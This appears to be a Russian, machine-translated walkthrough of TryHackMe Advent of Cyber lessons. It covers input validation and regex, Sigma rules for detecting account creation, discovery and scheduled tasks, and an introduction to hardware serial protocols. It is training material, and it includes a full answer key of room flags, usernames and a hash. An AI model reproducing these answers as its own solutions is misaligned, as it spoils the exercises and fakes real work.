На этом этапе мы уже хорошо осведомлены о проблемах безопасности, связанных с проверкой ввода. Подобно крепостной стене вашего приложения, которая образует первую линию обороны от множества сценариев от безобидного злоупотребления до откровенно злонамеренных намерений, проверка ввода заслуживает тех же усилий, что и ее средневековый аналог с точки зрения ее укрепления.

Само собой разумеется, что недостаточные усилия в этой области могут привести к тому, что векторы атак станут уязвимыми и, следовательно, будут использованы в вашем приложении. День 15 был посвящен проверке входных данных в свете неограниченной загрузки файлов, а день 16 был посвящен SQLi .

В этом задании мы рассмотрим проверку входных данных в более общем смысле, прежде чем коснуться одного из самых сложных вариантов ее использования: текстовых полей свободной формы, после чего кратко обсудим, как вы можете продвинуться вперед в своем пути к безопасному кодированию за пределами проверки входных данных.

Основы проверки входных данных

Как правило, эффективный способ проверки ввода — сначала узнать, как конкретная часть данных будет обрабатываться остальной частью вашего приложения. Задача 15-го дня — прекрасный пример, который более или менее демонстрирует мышление, необходимое для эффективного решения конкретного случая неограниченной загрузки файлов.

Затем данные проходят проверку синтаксиса и семантики, чтобы убедиться, что предоставленные пользователем значения являются правильными с точки зрения синтаксиса (ответ соответствует надлежащему контексту, заданному вопросом), и логического значения (значения имеют смысл для вопроса).

Возвращаясь к 15-му дню:

Вы не можете вручную ввести свое резюме в поле ввода — форма запрашивает файл, так что это просто не то, что запрашивается.
Вы не можете просто загрузить любой файл — он должен соответствовать набору очень конкретных правил, реализация которых обсуждалась в последних частях задания.
Затем следует белый список, где вы можете очень точно указать, что именно будут принимать ваши формы, и немедленно удалить или даже отбросить те, которые не вписываются в предопределенную разрешенную категорию.

HTML5 и регулярные выражения

Встроенные функции HTML5 очень помогают с проверкой вводимых пользователем данных, сводя к минимуму необходимость полагаться на JavaScript для той же цели. Элемент <input> , в частности, имеет ряд очень полезных возможностей, сосредоточенных вокруг проверки форм.

Например, <input> тип, который можно настроить на фильтрацию по электронной почте, URL-адресу или даже файлу, среди прочего, оперативно проверяет, соответствуют ли введенные пользователем данные типу данных, запрашиваемых формой, и, таким образом, в результате пользователю немедленно возвращается информация об их действительности.

Для еще более детального контроля над вводимыми данными можно интегрировать в микс регулярные выражения (regex). Просто используйте его в атрибуте "pattern" внутри элемента  <input> , и все готово. Вот хороший ресурс для начала работы с регулярными выражениями.  Ниже приведено несколько примеров.

1. <input type="text" id="uname" name="uname" pattern="[a-zA-Z0-9]+">
2. <input type="email" id="email" name="email" pattern=".+@tryhackme\.com">

Шаблон в первой строке кода выше — это, несомненно, один из самых основополагающих шаблонов регулярных выражений, которые можно использовать. Инструкция здесь — сопоставлять любые строки, специально составленные только из букв и цифр — буквенно-цифровой шаблон, нечувствительный к регистру.

Шаблон во второй строке кода выше немного более точен в своих инструкциях, указывая, что электронное письмо может иметь любые символы в начале, если оно заканчивается на «@tryhackme.com».

Разработка регулярных выражений может быть очень сложной, поскольку ее природа сложна; однако ее способность соответствовать очень конкретным шаблонам делает ее особенной. Хорошо построенные регулярные выражения представляют собой отличный способ немедленно отфильтровывать предоставленный пользователем ввод, который не соответствует определенным требованиям, которые вы установили. 

Регулярное выражение 101

В этом разделе будут рассмотрены некоторые советы по регулярным выражениям, с которых можно начать. Для соответствия любому строчному  символу английского алфавита шаблон регулярного выражения будет [a-z]. Мы можем разобрать его следующим образом:

Квадратные скобки указывают, что вы пытаетесь сопоставить один символ в наборе символов внутри них. Например, если мы пытаемся сопоставить любую гласную букву английского алфавита, мы строим наше регулярное выражение следующим образом: [aeiou]. Порядок символов не имеет значения, и оно будет соответствовать тому же.
Квадратные скобки также могут принимать диапазон символов путем добавления дефиса, как показано в нашем исходном примере.
Вы также можете смешивать и сопоставлять наборы символов в скобках. [a-zA-Z]означает, что вы хотите сопоставить любой символ английского алфавита независимо от регистра, а [a-z0-9]означает, что вы хотите сопоставить любой строчный буквенно-цифровой символ.
Нам также нужно поговорить об операторах регулярных выражений. Самый простой из них — это оператор подстановочных знаков, обозначаемый как .. Это означает, что регулярное выражение будет соответствовать любому символу, и оно довольно мощно при использовании с операторами *, +, и {min,max}. Оператор звездочка или звездочка  используется, если вам все равно, соответствует ли предыдущий токен чему-либо или нет, в то время как оператор плюс используется, если вы хотите убедиться, что он соответствует хотя бы один раз. Оператор фигурных скобок, с другой стороны, указывает количество символов, которые вы хотите сопоставить. Давайте рассмотрим следующие примеры:

Чтобы сопоставить строку, которая является буквенно-цифровой и нечувствительной к регистру, наш шаблон будет [a-zA-Z0-9]+. Оператор плюс означает, что мы хотим сопоставить строку, и нам все равно, насколько она длинная, пока она состоит из букв и цифр независимо от их регистра.
Если мы хотим убедиться, что первая часть строки состоит из букв, и хотим, чтобы она совпадала независимо от того, есть ли после нее цифры, это будет ^[a-zA-Z]+[0-9]*$. Операторы ^и $называются якорями и обозначают начало и конец строки, которую мы хотим сопоставить, соответственно. Поскольку мы хотели убедиться, что начало строки состоит только из букв, требуется добавление оператора каретки.
Если мы хотим сопоставить только строчные буквы длиной от 3 до 9 символов, наш шаблон будет иметь вид ^[a-z]{3,9}$.
Если нам нужна строка, начинающаяся с 3 букв, за которыми следуют любые 3 символа, наш шаблон будет ^[a-zA-Z]{3}.{3}$.
Также есть концепция группировки и экранирования, обозначаемая операторами ()и \соответственно. Группировка выполняется для лучшего управления сопоставлением определенных частей регулярного выражения, в то время как экранирование используется для сопоставления строк, содержащих операторы регулярного выражения. Наконец, есть оператор ?, который используется для обозначения того, что предшествующий токен является необязательным. Давайте рассмотрим следующий пример:

Если мы хотим сопоставить и www.tryhackme.com и tryhackme.com , наш шаблон будет ^(www\.)?tryhackme\.com$. Этот шаблон также позволит избежать сопоставления .tryhackme.com.
^(www\.)?:  ^Оператор отмечает начало строки, за которым следует группировка www и экранированный ., а сразу за ним оператор вопросительного знака. Группировка позволила оператору вопросительного знака сотворить свою магию, сопоставив обе строки с www. в начале или без него.
tryhackme\.com$: $Оператор отмечает конец строки, которому предшествует строка tryhackme, экранированный ., и строка com. Если мы не экранируем оператор ., движок регулярных выражений подумает, что мы хотим сопоставить любой символ между tryhackme и com.
Также необходимо отметить, что оператор wildcard может привести к лени и, как следствие, к неправильному использованию. Таким образом, всегда лучше использовать наборы символов через скобки, особенно когда мы проверяем ввод, поскольку хотим, чтобы он был идеальным.

Вот таблица, обобщающая все вышесказанное:

[]	Набор символов: соответствует любому отдельному символу/диапазону символов внутри
.	Подстановочный знак: соответствует любому символу
*	Квантификатор «звездочка»: соответствует предыдущему токену ноль или более раз
+	Плюсовой квантификатор: соответствует предыдущему токену один или несколько раз
{мин Макс}	Квантификатор фигурных скобок: указывает, сколько раз может повторяться предыдущий токен.
()	Группировка: группирует определенную часть регулярного выражения для лучшего управления.
\	Escape: экранирует оператор регулярного выражения, чтобы его можно было сопоставить
?	Необязательно: указывает, что предыдущий токен является необязательным.
^	Начало привязки: указывает, что последующий токен находится в начале строки.
$	Окончание привязки: указывает, что предыдущий токен находится в конце строки.
Уникальный случай текста свободной формы

Все методы, которые мы рассмотрели в этой задаче до сих пор, в основном касаются структурированных данных — данных, которые мы уже ожидаем, как они должны выглядеть. Однако, по сравнению с проверкой структурированных данных, свободный текст более сложен и не очень прост.

Структурированные данные обладают неотъемлемыми характеристиками, которые позволяют нам довольно быстро их отличать. Например, имена не должны состоять из специальных символов (некоторые имена содержат, но их можно внести в белый список), а возраст должен состоять только из цифр с абсолютным максимумом в 3 символа. Проверки синтаксиса и семантической валидации можно выполнять немедленно, и хаос внезапно перестает казаться таким уж ужасным.

Напротив, свободные текстовые поля более общедоступны, поэтому проверки валидности более ограничены, а проблема их защиты, как правило, более расплывчата. Тем не менее, как и все великие инженеры до нас, мы преодолеваем эти трудности и делаем лучшее из того, что нам дано. Ниже перечислены некоторые соображения для размышления.

Во-первых, мы снова начнем с вопроса о том, как этот фрагмент данных будет обрабатываться остальной частью приложения.
В каком контексте будет использоваться это поле свободного текста?  Свободные текстовые поля для сообщений в блогах обрабатываются совершенно иначе, чем текстовые поля, используемые для небольшого раздела комментариев или описательного текстового поля.
Необходимо ли поле свободного текста для ваших бизнес-целей в первую очередь или его можно реализовать по-другому, при этом достигая той же цели? Это также важно знать, поскольку часть написания безопасного кода заключается в избегании написания уязвимого кода!
Затем мы переходим к сложной части. Поскольку синтаксические и семантические проверки практически невозможны из-за природы текстовых полей свободной формы, наш лучший выбор для получения некоторого контроля — это белый список. В этой  памятке OWASP  перечислены общие методы для выполнения белого списка, которые можно обобщить следующим образом:

Убедитесь, что нет недопустимых символов, используя правильное кодирование, и
Белый список ожидаемых символов и наборов символов
Лучшая тактика исправления

В следующей части обсуждения давайте рассмотрим простой базовый код ниже, в котором программист пытается получить обычные данные от пользователя.

Базовый код

Пример немного голый и был бы мгновенным кошмаром, так как он вызывает много тревог не только с точки зрения безопасности, но и с точки зрения риска получить кучу мусорных ответов. Поскольку все они являются текстовыми  по умолчанию , поля дня рождения и возраста могут получать ответы, которые не соответствуют их конкретному контексту. Кроме того, злоумышленники имеют полную свободу действий над полями, что по сути дает им бесплатную игровую площадку для экспериментов.

Это тот случай, когда проверка ввода вообще не выполняется. Давайте немного исправим это и рассмотрим еще раз.

Отредактирован базовый код для включения атрибута типа

Изменения выше — это буквально просто добавления атрибута  type  и соответствующих им значений в элементе input. Тем не менее, между этой и базовой реализацией уже есть огромная разница. Обратите внимание, что безопасность не была главной целью этих изменений, но она успешно устраняет хаос, который в противном случае вызывала предыдущая реализация. Возвращаясь к обсуждению выше, это пример проверки синтаксиса, выполняемой на уровне HTML.

Однако реализация выше все еще подвержена злоупотреблениям, особенно для очень непослушных пользователей. Давайте исправим ее еще раз и рассмотрим ее еще раз.

Дальнейшее редактирование базового кода для включения семантических и белых списков методов

Изменения, внесенные выше, включают как семантическую проверку, так и методы ведения белого списка в существующую проверку синтаксиса в предыдущей реализации с целью дальнейшей фильтрации разрешенных значений, которые могут быть указаны в полях ввода.

Поле имени, например, было написано, чтобы разрешить максимум 70 символов — все еще довольно длинно, но довольно разумно. Это можно дополнительно фильтровать гранулярно, занося в черный список цифры и специальные символы, но для наших целей давайте пока примем это.
Поле даты изменено таким образом, что самая ранняя допустимая дата — 1900 год, а самая поздняя — 2014 год, при этом предполагается, что самому молодому пользователю сайта будет восемь лет.
Поле электронной почты также было переработано, чтобы принимать только электронные письма tryhackme, а поле URL еще больше сужено, чтобы принимать только комнаты tryhackme в качестве ответа на поле «favewebsite».
Эти семантические проверки должны соответствовать надлежащему бизнес-контексту, чтобы быть эффективными. Например, реализация выше ориентирована на персонал tryhackme, отмеченный полем электронной почты, принимающим только электронные письма tryhackme. Более того, применение основ проверки ввода не только гарантирует, что предоставляемые данные являются правильными, но и радикально ограничивает поверхность атаки полей ввода, особенно тех, которые требуют структурированных данных.

Вот почему мы не трогали поле <textarea> в самом конце блока кода. Как обсуждалось ранее, текст свободной формы уникален таким образом, что применение синтаксических и семантических проверок практически невозможно. Чтобы обеспечить его, нам сначала  нужно определить, какой контент (например, символы, наборы символов, символы и т. д.) является приемлемым, а затем выполнить фактическое внесение в белый список. Даже тогда этого будет недостаточно, поскольку это все еще очень открытое поле, и поэтому следует также реализовать такие методы, как экранирование вывода и использование параметризованных запросов, среди прочих. 

Клиентская сторона против серверной стороны

До этого момента наше обсуждение было направлено на использование проверки ввода, чтобы гарантировать, что фрагменты данных, которые мы получаем от пользователей, не являются мусором. Правильная проверка ввода на стороне клиента ограничивает неправильное использование и минимизирует поверхность атаки приложения, однако она не охватывает активно вредоносные случаи использования.

В отличие от приведенных выше примеров проверки ввода, реализованных на стороне клиента, экранирование вывода и использование параметризованных запросов реализованы на стороне сервера, что добавляет вычислительную нагрузку на сервер, но в конечном итоге помогает защитить приложение в целом.  Это делается как упражнение на внутреннее недоверие к вводу, предоставленному пользователем, несмотря на проверку. 

В приведенном ниже примере используется встроенная функция htmlentities() PHP для экранирования любого символа, который может повлиять на приложение.

$name = htmlentities($_GET['name'], ENT_QUOTES | ENT_HTML5, "UTF-8")

С другой стороны, представленный ниже пример использует библиотеку HTMLPurifier для решения некоторых задач, например, нашей <textarea>головоломки выше. 

Пример очистителя

Оба примера сделаны на стороне сервера для экранирования символов и очистки контента, соответственно, оба являются эффективными способами предотвращения злоупотреблений со стороны пользователя и атак XSS .  Реализация как клиентской, так и серверной валидации гарантирует, что ни один камень не останется неперевернутым.

Этот конкретный случай подчеркивает важность многоуровневой защиты и наглядно демонстрирует ограничения клиентской проверки ввода.  Он также порождает представление о том, что проверка ввода не является универсальным средством защиты вашего приложения.

Конкретные случаи требуют особых требований безопасности, и поэтому уже по одному этому фактору становится очевидным, что существует множество способов решения проблемы защиты вводимых пользователем данных, и в большинстве случаев они реализуются друг на друге.

Не все решения одинаковы

Проверка ввода — важный уровень безопасности, который должны иметь все приложения производственного уровня. Однако, независимо от того, насколько «идеальна» ваша проверка ввода для вашего конкретного варианта использования, существуют ограничения для всех видов реализаций безопасности — и проверка ввода не является исключением.

Вы не можете сделать свое приложение полностью защищенным от XSS только посредством проверки ввода. Элементы управления могут быть установлены на уровне ввода, что может уменьшить поверхность атаки приложения, но не полностью устранить ее. Полное устранение уязвимости XSS в вашем приложении требует дополнительных уровней защиты, таких как смягчение на уровне браузера (через защищенные файлы cookie, заголовки политики безопасности контента и т. д.) и экранирование и очистка вводимых пользователем данных.

В свете этих методов устранения имеет смысл решать каждую проблему по отдельности — уязвимости, связанные с SQL и LDAP, устраняются иначе, чем XSS , так зачем же пытаться подогнать их все под одну формулу?

Краткое содержание

Несмотря на то, что это очень важный элемент контроля безопасности, должное усердие в обеспечении безопасности приложений, включающих ввод данных пользователем, не должно останавливаться на проверке ввода как такового. Как видно из предыдущих примеров, ввод данных пользователем может быть допустимым, но это не обязательно означает, что он безвреден.

Существует множество инструментов и фреймворков, которые при правильном использовании могут помочь защитить ваше приложение. Например, возможности HTML5 могут помочь минимизировать неправильное использование формы ввода, в то время как использование регулярных выражений может помочь отфильтровать то, что нам нужно от пользователя, более детально. Мы подробно рассмотрели regex здесь, особенно из-за его мощной возможности реализовывать фильтры.

И хотя приведенные выше примеры не имеют прямого отношения к безопасности приложения, они помогают минимизировать поверхность атаки на приложение, которая дополнительно устраняется с помощью методов проверки на стороне сервера, таких как экранирование выходных данных и использование параметризованных запросов.

Мы должны быть реалистами и не пытаться решить все проблемы безопасности с помощью проверки ввода. Нет ни одного элемента управления, который мог бы предотвратить настойчивых злоумышленников, поэтому наложение этих элементов управления на уровни — лучший способ двигаться вперед.

Упражнение

Мы подготовили упражнение по регулярным выражениям, к которому вы можете получить доступ через предоставленную машину. Сначала давайте запустим виртуальную машину, нажав кнопку Start Machine в верхней части этой задачи. Машина запустится в режиме разделенного экрана. Если виртуальная машина не видна, используйте синюю кнопку Show Split View в правом верхнем углу страницы. 

Чтобы попрактиковаться в использовании регулярных выражений, сначала измените свой рабочий каталог на папку RegExPractice с помощью команды: cd ~/Desktop/RegExPractice затем вы можете использовать egrep с помощью следующего синтаксиса: egrep 'regex_pattern_here' stringsили скрипт regex_checker.py , написанный для вас на python python3 regex_checker.py:.

Мы понимаем, что некоторые структурированные данные сложнее других, поэтому мы установили определенный синтаксис, которому вы можете следовать, чтобы сделать упражнение проще.  Получайте удовольствие!

Фильтрация по именам пользователей: буквенно-цифровые, минимум 6 символов, максимум 12 символов, могут состоять из заглавных и строчных букв. 
Фильтрация писем:  следует форме "local-part@domain" (без кавычек); local-part — это случайная строка, а домен имеет вид "<имя домена>.tld". Все домены верхнего уровня (tld) имеют вид ".com"
Фильтрация URL-адресов: начинается с http или https; некоторые URL-адреса содержат «www», и должен существовать домен верхнего уровня.
### Ответить на вопросы ниже
Фильтрация по именам пользователей: Сколько имен пользователей соответствуют приведенному выше синтаксису?

```commandline
8
```
Фильтрация по именам пользователей:  одно имя пользователя состоит из читаемого слова, соединенного с числом. Что это?


```commandline
User35
```
Фильтрация писем: сколько писем соответствуют приведенному выше синтаксису?


```commandline
11
```
Фильтрация электронной почты:  сколько существует уникальных доменов?


```commandline
8
```
Фильтрация писем:  Каков домен письма с локальной частью «lewisham44»?


```commandline
amg.com
```
Фильтрация писем:  каков домен письма с локальной частью «maxximax»?


```commandline
fedfull.com
```
Фильтрация писем:  Какова локальная часть адреса письма с доменным именем « hotmail.com »?


```commandline
hussain.volt
```
Фильтрация URL-адресов:  сколько URL-адресов соответствуют предоставленному синтаксису?


```commandline
16
```
Фильтрация URL-адресов:  сколько из этих URL-адресов начинаются с «https»?


```commandline
7
```
Если вы чувствуете, что вам нужны более фундаментальные навыки в жизни, попробуйте  модуль Linux Fundamentals2. В 
нем все комнаты бесплатные!  
```commandline
Ответ не нужен
```

## Задание 23
Посмотрите видео-прохождение Cybrites на 18-й день  здесь !

Компрометация была подтверждена в инфраструктуре Best Festival Company, и в последние пару недель проводились тесты. 
Однако команда SOC Санты задается вопросом, существуют ли методологии, которые помогли бы им быстрее обнаруживать 
угрозы, анализируя собираемые ими журналы. Elf McSkidy знает о правилах Sigma и поручил вам узнать больше и 
поэкспериментировать с правилами обнаружения угроз.   

### Обнаружение угроз
Киберугрозы и преступники имеют продвинутые тактики, чтобы гарантировать, что они украдут информацию и вызовут хаос. 
Как вы уже видели в предыдущие дни, есть много способов, которыми это можно сделать. Также есть способы, которыми 
команды безопасности могут подготовить свою защиту и идентифицировать эти угрозы. Очевидно, что большинство действий 
синей команды потребуют проактивных подходов к анализу различных журналов, вредоносных программ и сетевого трафика. 
Это приводит к практике обнаружения угроз.    

Обнаружение угроз подразумевает упреждающее отслеживание и анализ аномальной активности в экосистеме для выявления 
признаков вредоносного взлома или вторжения в сеть. 

### Сценарий атаки
Elf McBlue получил журналы и информацию, касающуюся атаки на Best Festival Company бандитами Yeti. Благодаря 
различным анализам предыдущих дней стало ясно, что журналы указывают на вероятную цепочку атак, которой мог 
следовать противник, и которую можно сопоставить с Unified Kill Chain. Среди известных фаз UKC, которые были 
замечены, можно назвать следующие:   

- Устойчивость : злоумышленник обеспечил устойчивость, создав локальную учетную запись пользователя, которую он мог 
использовать во время своей атаки.
- Обнаружение : Злоумышленник пытался собрать информацию о своей цели, запуская команды для изучения процессов и 
  программного обеспечения на устройствах Санты с целью поиска потенциальных уязвимостей.
- Выполнение : Запланированные задания были созданы для предоставления начальных средств выполнения вредоносного кода.
  Это также может обеспечить им устойчивость или быть частью повышения их привилегий. 
Отчет о цепочке атак включал индикаторы компрометации (IOC) и необходимые параметры обнаружения, перечисленные ниже. 
  Кроме того, методы атаки были связаны с фреймворком MITRE ATT&CK для дальнейшего чтения. 

Прежде чем перейти к следующему разделу, разверните присоединенную машину и дайте ей до 5 минут на запуск ее служб. 
После запуска  используйте  AttackBox  или VPN  для доступа к ссылке http://MACHINE_IP  к нашему приложению Sigma, 
которое представляет собой следующие функции:  

Запустить  — отправить правило Sigma и посмотреть, обнаружит ли оно вредоносный IOC.
Текстовый редактор  . Запишите свое правило Сигмы в этом разделе.
Создать правило  — создать правило Sigma для вредоносного IOC.
Просмотр журнала  — просмотр сведений журнала, связанных с вредоносным IOC.
Рубка бревен с использованием правил Sigma
Sigma — это открытый исходный код языка сигнатур, разработанный Флорианом Ротом и Томасом Патцке для описания 
событий журнала в структурированном формате. Формат включает использование языка разметки YAML , разработанного 
синтаксиса, который позволяет аналитикам безопасности быстро обмениваться методами обнаружения. Общие факторы, 
которые следует учитывать в файлах YAML , включают следующее:

YAML  чувствителен к регистру.
Файлы должны иметь  .yml расширение.
Для отступов используются пробелы, а не табуляции.
Комментарии атрибутируются с использованием # персонажа.
Пары ключ-значение обозначаются с помощью : символа двоеточия.
Элементы массива обозначаются с помощью - символа тире.
Sigma упрощает сопоставление контента на основе собранных журналов для подачи оповещений об угрозах аналитикам для 
расследования. Файлы журналов обычно собираются и хранятся в базе данных или решении Security Information and Event 
Management ( SIEM ) для дальнейшего анализа. Sigma не зависит от поставщика; поэтому правила можно преобразовать в 
формат, который подходит для целевой SIEM .   

Sigma была разработана для удовлетворения следующих сценариев:
- Сделать методы обнаружения и сигнатуры доступными для совместного использования вместе с IOC и правилами Yara.
- Написать SIEM -поиск, который позволяет избежать привязки к поставщику.
- Для обмена сигнатурами с сообществами по разведке угроз.
- Написать специальные правила обнаружения вредоносного поведения на основе определенных условий.
### Синтаксис правила сигмы
Структура правила сигмыПравила Sigma руководствуются заданным порядком обязательных/необязательных полей и значений, 
которые создают структуру для отображения необходимых запросов. Прикрепленное изображение представляет собой 
скелетный вид правила Sigma.  

Давайте используем первый этап атаки, чтобы  определить требования к синтаксису, заполнить  детали в нашем скелетном 
правиле и обнаружить создание локальных учетных записей. Используйте раздел текстового редактора приложения SigHunt, 
чтобы следовать дальше.  

Название:  Называет правило на основе того, что оно должно обнаруживать.

ID:  Глобальный уникальный идентификатор, который разработчики Sigma в основном используют для поддержания порядка 
идентификации правил, отправляемых в публичный репозиторий, представленный в формате UUID .  

Статус: Описывает стадию, на которой находится зрелость правила во время использования. Существует пять объявленных 
статусов, которые вы можете использовать: 

- Стабильно : правило можно использовать в производственных средах и на панелях мониторинга.
- Тест : В настоящее время проводятся испытания правила, которые могут потребовать доработки.
- Экспериментальный : правило очень общее и находится в стадии тестирования. Оно может привести к ложным результатам, 
быть шумным и определять захватывающие события. 
- Устаревшее : правило было заменено и больше не будет давать точных результатов. 
- Не поддерживается : правило невозможно использовать в текущем состоянии (уникальный журнал корреляции, самодельные 
  поля).
- Описание: Предоставляет больше контекста о правиле и его предполагаемой цели. Здесь вы можете быть максимально 
подробными, чтобы предоставить информацию об обнаруженной активности. 
```commandline
local_account_creation.yml
title: Suspicious Local Account Creation
id: 0f06a3a5-6a09-413f-8743-e6cf35561297 
status: experimental
description: Detects the creation of a local user account on a computer.
Logsource:  Описывает данные журнала, которые будут использоваться для обнаружения. Он состоит из других необязательных атрибутов:

Продукт : выбирает все выходы журнала определенного продукта. Примеры: Windows, Apache
Категория : Выбирает файлы журналов, записанные выбранным продуктом. Примерами являются брандмауэры, веб и антивирус.
Service : выбирает только подмножество журналов. Примерами являются  sshd  на Linux или  Security  на Windows.
Определение : Описывает источник журнала и его применяемые конфигурации.
local_account_creation.yml
logsource:
  product: windows
  service: security

```

Обнаружение:   Обязательное поле в правиле обнаружения описывает параметры вредоносной активности, для которой нам 
нужно оповещение. Параметры делятся на две основные части: 
Идентификаторы поиска — это поля и значения, которые должна искать система обнаружения.
Выражение условия — задает действие, которое должно быть выполнено при обнаружении, например, выбор или фильтрация. 
Самое важное, на что следует обратить внимание при создании учетной записи в Windows, — это идентификатор события, 
связанный с учетными записями пользователей. В этом случае идентификатор события: 4720 был предоставлен нам в списке 
IOC , который будет нашим идентификатором поиска.   
```commandline
local_account_creation.yml
detection:
  selection:
    EventID:  # This shows the search identifier value
      - 4720    # This shows the search's list value
  condition: selection

Идентификаторы поиска можно улучшить, используя различные модификаторы, добавляемые к имени поля с помощью символа вертикальной черты |. Основной тип модификаторов известен как модификаторы преобразования  и включает значения: contains , endswith , startswith и all . Некоторые из этих модификаторов будут иметь решающее значение при написании правил против других IOC.
random_rule.yml
detection:
  selection:
    Image|endswith:
      - '\svchost.exe'
    CommandLine|contains|all: 
      - bash.exe
      - '-c '   
  condition: selection
FalsePositives:  список известных ложных срабатываний, которые могут возникнуть на основе данных журнала.

Уровень:  Описывает серьезность, с которой группа безопасности должна отнестись к деятельности в соответствии с письменным правилом. Атрибут состоит из пяти уровней: Информационный -> Низкий -> Средний -> Высокий -> Критический

Теги:  Добавляет информацию, которая может быть использована для категоризации правила. Общие теги связаны с тактиками и приемами из фреймворка MITRE ATT&CK. Разработчики Sigma определили список  предопределенных тегов .

local_account_creation.yml
falsepositives: 
    - unknown
level: low
tags:
   - attack.persistence # Points to the MITRE Tactic
   - attack.T1136.001 # Points to the MITRE Technique
```


Вуаля!! Мы написали наше первое правило Sigma и можем запустить его в приложении AoC Sigma Hunting, чтобы посмотреть,
сможем ли мы получить совпадение. Как упоминалось ранее, правила Sigma преобразуются в соответствии с желаемым 
запросом SIEM, и в нашем случае следует знать, что они преобразуются в Elastic Queries на бэкэнде. Эту задачу 
выполняют различные ресурсы, причем нативным инструментом является Sigmac, который устарел и заменен более 
стабильной библиотекой Python, pySigma . Еще один примечательный инструмент для проверки — Uncoder.io. Uncoder.IO — 
это веб-конвертер Sigma с открытым исходным кодом для многочисленных платформ SIEM и EDR. Он прост в использовании, 
поскольку позволяет вам копировать ваше правило Sigma на платформу и выбирать предпочитаемое вами бэкэнд-приложение 
для перевода.       

### Активность
Вооружившись знаниями о правилах Sigma, ваша задача — выполнить оставшиеся два задания, написав правила, 
соответствующие фазам цепочки атак и IOC. Санта рассчитывает на то, что вы укрепите свою безопасность против 
злоумышленников, пытающихся остановить Рождество в этом году. Напоминаем, что обязательные поля для атак приведены 
ниже:   

Обнаружение программного обеспечения :  категория, идентификатор события, изображение, командная строка.
Запланированные задания : категория, идентификатор события, изображение, командная строка.
Дровосек Ленни использует Sigma

### Ответить на вопросы ниже
Что такое флаг Вызова №1?

```commandline
THM{n0t_just_your_u$ser}
```
Согласно журналу Challenge 1, какая учетная запись пользователя была создана?

```commandline
BanditYetiMini
```
Что такое флаг Вызова №2?

```commandline
THM{wh@t_1s_Runn1ng_H3r3}
```
Каков был путь пользователя в файле журнала Задачи №2?

```commandline
SIGMA_AOC2022\Bandit Yeti
```
Что такое флаг Вызова №3?

```commandline
THM{sch3dule_0npo1nt_101}
```
Какой MD5-хеш был связан с журналами Challenge #3?

```commandline
2F6CE97FAF2D5EEA919E4393BDD416A7
```
Если вы хотите узнать больше о Sigma, выполните это задание в нашей комнате Sigma. Если вам понравился аспект 
инженерного обнаружения, вам стоит заглянуть в комнату Yara, чтобы узнать больше!  
```commandline
Ответ не нужен
```

## Задание 24
Посмотрите  видео-обучение Джона Хаммонда к 19-му дню  здесь !

### Шпионаж за Сантой

Эльф МакСкиди проводил регулярную проверку мастерской Санты, когда обнаружил аппаратный имплант! Имплант имеет 
веб-камеру, прикрепленную к микропроцессору, и еще один чип. Кажется, кто-то задумал что-то злонамеренное... Мы 
должны попытаться понять, что этот имплант пытался сделать! Мы разберемся с микропроцессором и веб-камерой в будущих 
задачах; а пока давайте попробуем выяснить, для чего используется этот другой чип.    
Виртуальная машина , которую мы будем использовать в этой задаче, запускается примерно через 8 минут. Мы предлагаем 
вам запустить машину сейчас, чтобы она была готова к тому времени, когда вы доберетесь до практической части задачи! 

### Цели обучения

- Как данные передаются по электрическим проводам в низкоуровневом оборудовании
- Аппаратные протоколы связи
- Как анализировать аппаратные протоколы связи
- Чтение данных USART из логического захвата
### Добро пожаловать в Матрицу

Аппаратный взлом часто окутан тайной и рассматривается как сверхсложная тема. Хотя существует множество сложных 
компонентов аппаратного взлома, разобраться в этом на самом деле довольно просто. Современные компьютеры невероятно 
мощны. Это позволяет им встраивать дополнительные функции и меры безопасности в свои протоколы связи, чтобы 
гарантировать надежную передачу сообщений. Подумайте о протоколе управления передачей ( TCP ), который имеет 
несколько избыточностей! Он даже отправляет три полных пакета только для того, чтобы начать общение!    

В мире микрочипов у нас часто нет такой роскоши. Чтобы убедиться, что наши протоколы связи максимально эффективны, 
нам нужно сделать их максимально простыми. Для этого нам нужно войти в мир нулей и единиц. Тогда возникает вопрос, 
как оборудование потребляет электричество и генерирует сигналы? В этой задаче мы сосредоточимся на цифровой связи. 
Для аппаратной связи мы используем устройство, называемое логическим анализатором, для анализа сигналов. Это 
устройство можно подключить к реальным электрическим проводам, которые используются для связи между двумя 
устройствами, которые будут захватывать и интерпретировать отправляемые сигналы. В этой задаче мы будем использовать 
логический анализатор для определения связи между двумя устройствами в несанкционированном импланте.      

### Электрическое сердцебиение

Возвращаясь к нашему вопросу, если у нас есть электричество, как мы можем сгенерировать цифровой сигнал? Подход, 
который используют большинство аппаратных компонентов, заключается в том, чтобы просто включать и выключать питание. 
Если питание включено, мы передаем цифровую 1. Если питание выключено, мы передаем цифровой 0. Мы называем эти 1 и 0 
битами. Чтобы осуществить связь, мы просто включаем и выключаем питание в определенной последовательности, чтобы 
передать кучу нулей и единиц. Если мы отправляем 8 бит, мы отправляем один байт! Вуаля! Мы только что осуществили 
цифровую аппаратную связь! Вот такие замечательные волнистые линии вы увидите на логическом анализаторе:       

### логическийанализатор

Мы можем передавать текстовые данные, используя таблицу ASCII . Отправляя двоичное представление каждого символа, мы 
можем передавать данные! Однако на самом деле это не так просто. Если бы мы хотели нулевых усилий в нашей 
коммуникации, нам бы понадобился электрический провод для каждого 0 или 1, который мы хотели бы передать. Учитывая, 
что один символ — это один байт данных (следовательно, 8 электрических проводов), это может очень быстро 
превратиться в беспорядок из проводов! Чтобы сделать это более эффективным, нам нужно использовать меньше проводов, 
а затем заставить оба аппаратных чипа согласовать определенный цифровой протокол и конфигурацию, которые будут 
использоваться для передачи данных. Давайте рассмотрим некоторые из наиболее распространенных протоколов и то, как 
они работают, чтобы по-прежнему отправлять данные, сокращая при этом количество необходимых нам проводов.        

### USART

Универсальная синхронная/асинхронная приемо-передающая связь (USART), или, как ее больше называют, последовательная 
связь, — это протокол, использующий два провода. Один провод используется для передачи (TX) данных с устройства A на 
устройство B, а другой провод используется для приема (RX) данных на устройстве A с устройства B. По сути, мы 
подключаем порт передачи одного устройства к порту приема другого устройства и наоборот.   

Что интересно в этом протоколе, так это то, что нет линии часов, которая синхронизирует связь устройств. Без часов 
устройства должны согласовать конфигурацию связи, например, следующую: 
- Скорость связи - это также называется скоростью передачи данных или битрейтом и определяет, как быстро могут быть 
  отправлены байты данных. Согласование определенной скорости сообщает каждому устройству, как быстро оно должно 
  производить выборку данных для получения точной связи. Хотя существуют фиксированные стандарты для скорости 
  передачи данных, устройства могут использовать любую другую скорость, если оба устройства ее поддерживают.    
